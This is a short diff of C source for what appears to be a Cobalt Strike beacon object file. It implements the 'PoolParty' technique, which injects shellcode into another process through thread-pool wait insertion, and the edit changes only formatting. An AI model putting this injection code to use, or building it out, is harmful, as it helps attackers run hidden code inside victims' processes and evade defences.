@@ -1,6 +1,7 @@
 #include "PoolParty.h"
 
-void RemoteTpWaitInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
+void RemoteTpWaitInsertion(HANDLE hTarget, LPVOID pShellcodeAddress)
+{
     _ZwAssociateWaitCompletionPacket ZwAssociateWaitCompletionPacket = (_ZwAssociateWaitCompletionPacket)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAssociateWaitCompletionPacket"));
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
 
@@ -39,6 +40,6 @@ void Inject3(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
         
         RemoteTpWaitInsertion(hTarget, pShellcodeAddress);
     } else { 
-          BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
-      }
+        BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
+    }
 }
